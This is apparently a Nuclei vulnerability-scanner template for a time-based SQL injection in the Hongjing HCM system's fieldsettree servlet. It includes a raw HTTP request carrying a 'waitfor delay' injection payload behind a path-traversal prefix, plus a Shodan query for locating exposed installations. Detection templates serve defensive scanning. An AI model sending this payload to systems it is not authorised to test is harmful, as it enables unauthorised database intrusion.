id: Hongjing_Herm_fieldsettree_SQL_injected

info:
  name: Hongjing_Herm_fieldsettree_SQL_injected
  author: HK
  severity: high
  description: 宏景HCM系统/templates/attestation/../../servlet/fieldsettree接口存在SQL注入漏洞
  metadata:
    max-request: 1
    shodan-query: body="/images/hcm/themes/default/login/li.png"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:5'+-- HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36


  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 5'